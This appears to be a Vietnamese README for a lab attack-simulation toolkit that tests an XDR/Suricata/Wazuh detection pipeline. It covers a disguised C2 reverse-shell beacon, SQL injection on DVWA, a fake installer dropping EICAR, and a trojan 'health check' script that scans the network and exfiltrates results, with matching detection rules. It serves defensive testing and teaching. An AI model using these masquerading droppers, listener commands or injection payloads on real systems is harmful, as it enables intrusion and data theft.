# CyberFortress RedOps - Attack Simulation Modules

Bộ công cụ mô phỏng tấn công để kiểm thử hệ thống SmartXDR theo khung MITRE ATT&CK.

## Tổng quan các Module

| Module                 | MITRE ATT&CK     | Mục tiêu                      | Phản ứng mong đợi     |
| ---------------------- | ---------------- | ----------------------------- | --------------------- |
| c2-outbound-connection | T1071, T1571     | Windows 11 Client → C2 Server | Cô lập Host + Chặn IP |
| sql-injection          | T1190            | Kali → DVWA Web Server        | Chặn IP tấn công      |
| malware-execution      | T1204.002, T1105 | Windows 11 Client             | Cô lập Host           |
| network-scanning       | T1046, T1041     | Ubuntu → LAN                  | Cô lập Host           |

---

## 4.3.2. Kịch bản 1: Kết nối C2 (C2 Outbound Connection)

### Mô tả kịch bản

Mô phỏng tình huống máy trạm Windows bị nhiễm mã độc, thiết lập kết nối beacon đến máy chủ C2 (Command & Control) trên Internet. Đây là kỹ thuật phổ biến trong các nhóm APT để duy trì quyền điều khiển từ xa.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                  | Mô tả                              |
| ------------ | ------------------------------- | ---------------------------------- |
| T1071.001    | Application Layer Protocol: Web | Sử dụng HTTP/HTTPS để giao tiếp C2 |
| T1571        | Non-Standard Port               | Có thể sử dụng port không chuẩn    |
| T1059.001    | PowerShell                      | Thực thi lệnh từ xa                |

### Thành phần

```
src/c2-outbound-connection/
├── c2_reverse_shell.py      # Script C2 chính
├── config.txt               # Cấu hình C2 host/port
├── malicious_ip.txt         # Danh sách IP IOC
├── suricata.local.rules     # Rules phát hiện Suricata
├── c2_detection.zeek        # Rules phát hiện Zeek
└── icons/                   # Icons giả dạng PDF/Word
```

### Cấu hình

**config.txt:**
```ini
C2_HOST=147.185.133.114
C2_PORT=80
RETRY_INTERVAL=3
```

### Quy trình thực hiện

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Windows 11     │         │   Suricata/     │         │  C2 Server      │
│  (Victim)       │────────▶│   Zeek Sensor   │────────▶│  (Attacker)     │
│  192.168.85.150 │         │                 │         │  147.185.133.114│
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. Chạy Financial_Report_2025.exe
        │ 2. Mở decoy PDF
        │ 3. Gửi HTTP beacon đến C2
        │                          │
        │                    4. Suricata detect SID 9000010-9000015
        │                    5. Alert → Wazuh → SmartXDR
        │                          │
        ▼                          ▼
   [Cô lập Host]            [Chặn IP C2]
```

### Thực thi

**Trên Attacker (Kali):**
```bash
# Khởi động C2 listener
nc -lvnp 80
```

**Trên Victim (Windows):**
```powershell
# Chạy malware
.\Financial_Report_2025.exe
```

### Detection Rules (Suricata)

```
# SID 9000010: Beacon URI pattern
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 Beacon Pattern Detected (GET /beacon)"; http.uri; content:"/beacon"; sid:9000010;)

# SID 9000012: Malware User-Agent
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 Suspicious User-Agent (MalwareBot)"; http.user_agent; content:"MalwareBot"; sid:9000012;)

# SID 9000013: C2 Header
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"C2 X-Bot-ID Header Detected"; http.header; content:"X-Bot-ID"; sid:9000013;)
```

### Kết quả mong đợi

| Thành phần | Hành động                                  |
| ---------- | ------------------------------------------ |
| Suricata   | Alert SID 9000010-9000015                  |
| Zeek       | Notice C2Detection::C2_Connection_Attempt  |
| Wazuh      | Rule trigger → Active Response             |
| SmartXDR   | Classify: ATTACK → Isolate Host + Block IP |

---

## 4.3.3. Kịch bản 2: Tấn công SQL Injection

### Mô tả kịch bản

Kẻ tấn công từ bên ngoài (External Attacker) thực hiện tấn công SQL Injection vào ứng dụng web DVWA để đánh cắp dữ liệu hoặc leo thang đặc quyền.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                    | Mô tả                          |
| ------------ | --------------------------------- | ------------------------------ |
| T1190        | Exploit Public-Facing Application | Khai thác lỗ hổng ứng dụng web |
| T1059.001    | Command and Scripting Interpreter | Thực thi SQL commands          |

### Thành phần

```
src/sql-injection/
├── sqli_attack.sh           # Wrapper script cho sqlmap
├── config.json              # Cấu hình target, credentials
├── suricata.local.rules     # Rules phát hiện
└── README.md
```

### Cấu hình

**config.json:**
```json
{
    "target": {
        "host": "dvwa.local",
        "port": 80,
        "base_url": "/vulnerabilities/sqli/"
    },
    "credentials": {
        "username": "admin",
        "password": "password"
    },
    "attack": {
        "security_level": "low"
    }
}
```

### Quy trình thực hiện

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Kali Linux     │         │   Suricata      │         │  DVWA Server    │
│  (Attacker)     │────────▶│   (IDS)         │────────▶│  (Target)       │
│  192.168.71.100 │         │                 │         │  192.168.85.112 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. ./sqli_attack.sh
        │ 2. sqlmap gửi SQLi payloads
        │ 3. ' OR '1'='1' --
        │ 4. UNION SELECT...
        │                          │
        │                    5. Suricata detect SID 9001001-9001010
        │                    6. Alert → Wazuh → SmartXDR
        │                          │
        ▼                          ▼
                             [Chặn IP Attacker]
```

### Thực thi

**Trên Attacker (Kali):**
```bash
cd src/sql-injection
chmod +x sqli_attack.sh
./sqli_attack.sh
```

### Detection Rules (Suricata)

```
# SID 9001001: UNION-based SQLi
alert http any any -> $HOME_NET any (msg:"SQLI Union-Based SQL Injection Attempt"; http.uri; content:"UNION"; content:"SELECT"; sid:9001001;)

# SID 9001002: OR-based SQLi
alert http any any -> $HOME_NET any (msg:"SQLI OR-Based SQL Injection"; pcre:"/(\%27|')(\s|%20)*(OR|or)(\s|%20)*('|%27)?1/i"; sid:9001002;)

# SID 9001010: DVWA specific
alert http any any -> $HOME_NET any (msg:"SQLI Attack on DVWA SQLi Module"; http.uri; content:"/vulnerabilities/sqli"; sid:9001010;)
```

### Kết quả mong đợi

| Thành phần      | Hành động                            |
| --------------- | ------------------------------------ |
| Suricata        | Alert SID 9001001-9001010            |
| ModSecurity WAF | Block request (403)                  |
| Wazuh           | Rule trigger → Active Response       |
| SmartXDR        | Classify: ATTACK → Block Attacker IP |

---

## 4.3.4. Kịch bản 3: Thực thi mã độc (Malware Execution)

### Mô tả kịch bản

Người dùng bị lừa tải và thực thi file cài đặt giả mạo. File này hiển thị giao diện "Installing..." nhưng ngầm tải EICAR test malware về máy.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name                 | Mô tả                        |
| ------------ | ------------------------------ | ---------------------------- |
| T1204.002    | User Execution: Malicious File | Người dùng chạy file độc hại |
| T1105        | Ingress Tool Transfer          | Tải payload từ Internet      |
| T1036        | Masquerading                   | Giả dạng phần mềm hợp pháp   |

### Thành phần

```
src/malware-execution/
├── fake_installer.py        # Dropper source code
├── README.html              # Fake installation guide
├── suricata.local.rules     # Rules phát hiện
└── dist/
    └── MediaPlayerPro_Setup.zip  # Deliverable package
```

### Payload

```python
PAYLOAD_URL = "https://secure.eicar.org/eicar.com.txt"
FAKE_APP_NAME = "Media Player Pro"
PAYLOAD_FILENAME = f"{FAKE_APP_NAME}.exe"
```

### Quy trình thực hiện

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Windows 11     │         │   Suricata      │         │  EICAR Server   │
│  (Victim)       │────────▶│   (IDS)         │────────▶│  (Internet)     │
│  192.168.85.150 │         │                 │         │  secure.eicar.org│
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │
        │ 1. Giải nén MediaPlayerPro_Setup.zip
        │ 2. Mở README.html (fake guide)
        │ 3. Chạy install.exe
        │ 4. Hiển thị "Installing... 100%"
        │ 5. Ngầm download EICAR từ secure.eicar.org
        │
        ▼                          │
   [EICAR detected]          6. Suricata detect SID 9003001-9003003
   [AV/EDR Alert]            7. Alert → Wazuh → SmartXDR
        │                          │
        ▼                          ▼
   [Cô lập Host]            [Quarantine File]
```

### Thực thi

**Trên Victim (Windows):**
```powershell
# Giải nén và chạy
Expand-Archive MediaPlayerPro_Setup.zip -DestinationPath .
.\install.exe
```

### Detection Rules (Suricata)

```
# SID 9003001: EICAR download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE EICAR Test File Download"; http.host; content:"secure.eicar.org"; sid:9003001;)

# SID 9003003: EICAR signature
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"MALWARE EICAR in Response"; file_data; content:"X5O!P%@AP"; sid:9003003;)
```

### Kết quả mong đợi

| Thành phần       | Hành động                       |
| ---------------- | ------------------------------- |
| Suricata         | Alert SID 9003001-9003003       |
| Windows Defender | Detect EICAR → Quarantine       |
| Wazuh            | Sysmon Event 11 (FileCreate)    |
| SmartXDR         | Classify: ATTACK → Isolate Host |

---

## 4.3.5. Kịch bản 4: Do thám mạng nội bộ (Network Scanning)

### Mô tả kịch bản

Một máy Ubuntu trong mạng nội bộ bị xâm nhập, kẻ tấn công cài script giả dạng "System Health Check" để quét mạng và gửi kết quả về máy chủ điều khiển.

### MITRE ATT&CK Mapping

| Technique ID | Technique Name               | Mô tả                     |
| ------------ | ---------------------------- | ------------------------- |
| T1046        | Network Service Scanning     | Quét port/dịch vụ mạng    |
| T1041        | Exfiltration Over C2 Channel | Gửi dữ liệu về attacker   |
| T1036        | Masquerading                 | Giả dạng utility hợp pháp |

### Thành phần

```
src/network-scanning/
├── system_health_check.sh   # Trojan script (disguised)
├── listener.py              # Attacker receiver
├── config.json              # Scan configuration
└── suricata.local.rules     # Rules phát hiện
```

### Cấu hình

**config.json:**
```json
{
    "attacker": {
        "host": "192.168.71.100",
        "port": 8080
    },
    "scan": {
        "target_network": "192.168.85.0/24",
        "ports": "22,80,443,3389,8080"
    }
}
```

### Quy trình thực hiện

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Ubuntu         │         │   Suricata/     │         │  Kali Linux     │
│  (Victim)       │────────▶│   Zeek Sensor   │────────▶│  (Attacker)     │
│  192.168.85.112 │         │                 │         │  192.168.71.100 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. wget http://attacker:8080/system_health_check.sh
        │ 2. chmod +x && sudo ./system_health_check.sh
        │ 3. Hiển thị "✓ Checking disk space..."
        │ 4. Ngầm chạy nmap scan
        │ 5. POST kết quả về attacker
        │                          │
        │                    6. Suricata detect SID 9002001-9002012
        │                    7. Alert → Wazuh → SmartXDR
        │                          │
        ▼                          ▼
   [Cô lập Host]            [Block Exfil]
```

### Thực thi

**Trên Attacker (Kali):**
```bash
cd src/network-scanning
python3 listener.py --port 8080
```

**Trên Victim (Ubuntu):**
```bash
wget http://192.168.71.100:8080/system_health_check.sh
chmod +x system_health_check.sh
sudo ./system_health_check.sh
```

### Detection Rules (Suricata)

```
# SID 9002001: Nmap ping sweep
alert icmp any any -> $HOME_NET any (msg:"SCAN NMAP Ping Sweep"; itype:8; threshold:type both,track by_src,count 20,seconds 5; sid:9002001;)

# SID 9002010: Data exfiltration
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"EXFIL Network Scan Data Upload"; http.uri; content:"/upload"; http.content_type; content:"application/json"; sid:9002010;)

# SID 9002012: HealthCheck UA
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"EXFIL Suspicious HealthCheck User-Agent"; http.user_agent; content:"HealthCheck"; sid:9002012;)
```

### Kết quả mong đợi

| Thành phần | Hành động                                 |
| ---------- | ----------------------------------------- |
| Suricata   | Alert SID 9002001-9002012                 |
| Zeek       | Notice C2Detection::C2_Connection_Attempt |
| Wazuh      | Rule trigger → Active Response            |
| SmartXDR   | Classify: ATTACK → Isolate Host           |

---

## Tóm tắt Detection Rules

| Module                 | SID Range       | Số Rules |
| ---------------------- | --------------- | -------- |
| c2-outbound-connection | 9000001-9000022 | 15       |
| sql-injection          | 9001001-9001020 | 10       |
| malware-execution      | 9003001-9003020 | 8        |
| network-scanning       | 9002001-9002012 | 8        |

## Build Commands

```bash
# Build tất cả modules
python build.py c2-shell-pdf
python build.py malware-installer

# Tạo ZIP package
Compress-Archive -Path "dist\malware-installer\install.exe", "src\malware-execution\README.html" -DestinationPath "dist\MediaPlayerPro_Setup.zip" -Force
```
